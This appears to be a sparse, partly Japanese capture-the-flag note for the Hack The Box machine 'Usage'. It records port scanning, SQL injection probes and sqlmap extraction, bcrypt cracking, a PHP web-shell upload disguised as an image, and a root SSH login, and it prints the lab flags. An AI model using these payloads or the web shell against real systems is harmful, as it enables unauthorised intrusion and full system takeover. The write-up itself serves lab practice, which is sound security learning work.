**Recon & Enum**

rustscan -r 1-65535 -a 10.10.11.18 -- -sV -Pn -A

![[Usage image.png]]

![[Usage image 1.png]]

![[Usage image 2.png]]

echo "10.10.11.18 usage.htb" | sudo tee -a /etc/hosts

![[Usage image 3.png]]

Browser　Access

![[Usage image 4.png]]

http://usage.htb/forget-password

![[Usage image 5.png]]

SQL Injection Test

' or'1'='1';--

![[Usage image 6.png]]

' union select null;--

![[Usage image 7.png]]

![[Usage image 8.png]]

some

BurpSuite

![[Usage image 9.png]]

Copy and paste all of the above content into the req.txt.

vim req.txt

sqlmap

sqlmap -r ../../request --threads=10 --level=5 --risk=3 --batch --dbs

hashid hash.txt

![[Usage image 10.png]]

hashcat -m 3200 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

![[Usage image 11.png]]

![[Usage image 12.png]]

![[Usage image 13.png]]

![[Usage image 14.png]]

適当な画像を用意し、再度BurpSuiteを起動してアップロードします。

その後、拡張子をjpgからphpに変更し、画像データのバイナリを

\<?php system($_GET\['cmd'\]); ?> .

![[Usage image 15.png]]

↓

![[Usage image 16.png]]

test.php

http://admin.usage.htb/uploads/images/test.php?cmd=whoami

![[Usage image 17.png]]

![[Usage image 18.png]]

![[Usage image 19.png]]

66953eea9819aa1d90eb66aebe66b663

Privilege Escalation

![[Usage image 20.png]]

3nc0d3d_pa$$w0rd

![[Usage image 21.png]]

![[Usage image 22.png]]

![[Usage image 23.png]]

![[Usage image 24.png]]

Retry

![[Usage image 25.png]]

![[Usage image 26.png]]

vim root_rsa

ssh -i root_rsa root@10.10.11.18

![[Usage image 27.png]]

このエラーは、SSHクライアントがリモートホストに接続しようとしている際に発生します。エラーメッセージの各部分を解説します。

1\. \`The authenticity of host '10.10.11.18 (10.10.11.18)' can't be established.\`: このメッセージは、SSHクライアントが指定されたIPアドレスのホストに接続しようとしているが、そのホストの認証情報がSSHクライアントによって確認できないことを示しています。

2\. \`ED25519 key fingerprint is SHA256:4YfMBkXQJGnXxsf0IOhuOJ1kZ5c1fOLmoOGI70R/mws.\`: リモートホストの公開鍵のフィンガープリントが表示されています。これは、ホストの識別子として使用されます。

3\. \`Are you sure you want to continue connecting (yes/no/\[fingerprint\])? yes\`: SSHクライアントは、リモートホストに接続を続行するかどうかを確認するためのプロンプトを表示しています。ここで "yes" と入力することで接続を続行します。

4\. \`Warning: Permanently added '10.10.11.18' (ED25519) to the list of known hosts.\`: SSHクライアントが、リモートホストの公開鍵を永続的に「known_hosts」というファイルに追加することを警告しています。

5\. \`WARNING: UNPROTECTED PRIVATE KEY FILE! Permissions 0644 for 'root_rsa' are too open. It is required that your private key files are NOT accessible by others. This private key will be ignored. Load key "root_rsa": bad permissions\`: この警告は、プライベートキーのパーミッションがセキュリティ上のリスクを引き起こしていることを示しています。ファイル "root_rsa" の<u>パーミッションが "0644</u>" に設定されており、他のユーザーにも読み取り可能です。SSHクライアントは、セキュリティ上の理由から==🟢このプライベートキーを無視==します。

このエラーを解決するには、プライベートキーファイルのパーミッションを適切に設定する必要があります。一般的には、\`chmod 600 root_rsa\`のようにして、所有者のみが読み取りと書き込みの権限を持つようにします。

![[Usage image 28.png]]

ssh -i root_rsa root@10.10.11.18

![[Usage image 29.png]]

585a3e203ca98ab0f5077feb5d5bdcdd